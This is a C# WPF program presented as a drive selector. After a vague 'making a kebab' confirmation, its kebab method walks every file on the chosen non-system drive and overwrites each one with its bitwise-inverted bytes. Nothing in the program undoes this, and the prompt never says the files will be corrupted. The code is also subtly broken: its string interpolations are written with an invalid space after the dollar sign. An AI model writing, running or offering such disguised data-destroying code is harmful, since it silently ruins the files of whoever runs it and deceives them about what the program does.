using System;
using System.IO;
using System.Threading.Tasks;
using System.Threading;
using System.Windows;
using System.Windows.Controls;

namespace DiskSelector {
  public partial class MainWindow {
    public MainWindow() {
      InitializeComponent();

      foreach(DriveInfo drive in DriveInfo.GetDrives()) {
        if (drive.DriveType == DriveType.Fixed ||
          drive.DriveType == DriveType.Removable) {
          ComboBoxItem item = new ComboBoxItem();

          if (drive.RootDirectory.Name != "C:\\") {
            item.Content = $ "{drive.RootDirectory.Name} {drive.VolumeLabel}";
          } else {
            continue;
          }

          DiskComboBox.Items.Add(item);
        }
      }

      DiskComboBox.SelectionChanged += DiskComboBox_SelectionChanged;
      status_bar.Value = 10;
    }

    string disk_name = "";

    private void DiskComboBox_SelectionChanged(object sender, SelectionChangedEventArgs e) {
      ComboBoxItem selectedItem = DiskComboBox.SelectedItem as ComboBoxItem;
      if (selectedItem != null) {
        disk_name = $ "Selected: {selectedItem.Content}";
        show.Text = disk_name;
        status_bar.Value = 30;

      }

    }

    private void start_kebab(object sender, RoutedEventArgs e) {
      if (string.IsNullOrWhiteSpace(disk_name)) {
        MessageBox.Show("Nothing selected");

      } else {

        status_bar.Value = 50;
        string disk_letter = disk_name.Substring(10, 2);

        MessageBoxResult result = MessageBox.Show("This may take a while\naccept this and see results", "Last step making a kebab", MessageBoxButton.YesNo, MessageBoxImage.Question);

        if (result == MessageBoxResult.Yes) {

          kebab(disk_letter);

        } else {

          MessageBox.Show("Program Stopped");
        }
      }

    }

    private void kebab(string disk_letter) {

      try {

        string driveLetter = disk_letter;
        DriveInfo drive = new DriveInfo(driveLetter);

        DirectoryInfo rootDirectory = drive.RootDirectory;

        status_bar.Value = 70;

        foreach(FileInfo file in rootDirectory.GetFiles("*.*", SearchOption.AllDirectories)) {
          using(FileStream fs = file.Open(FileMode.Open, FileAccess.ReadWrite)) {

            byte[] buffer = new byte[fs.Length];
            fs.Read(buffer, 0, buffer.Length);

            for (int i = 0; i < buffer.Length; i++) {
              buffer[i] = (byte)(~buffer[i] & 0xFF);

            }

            fs.Seek(0, SeekOrigin.Begin);

            fs.Write(buffer, 0, buffer.Length);
          }
        }
        status_bar.Value = 100;

        MessageBox.Show("Kebab done");

        status_bar.Value = 0;

      } catch (Exception ex) {
        MessageBox.Show("Error: " + ex.Message);

      }

    }
  }

}
